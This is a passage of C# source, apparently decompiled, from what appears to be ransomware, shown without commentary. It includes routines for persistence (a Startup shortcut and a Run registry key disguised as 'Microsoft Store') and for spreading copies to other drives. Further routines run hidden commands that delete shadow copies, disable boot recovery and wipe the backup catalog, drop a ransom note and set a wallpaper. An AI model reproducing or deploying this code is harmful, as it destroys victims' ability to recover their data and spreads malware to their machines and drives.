				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
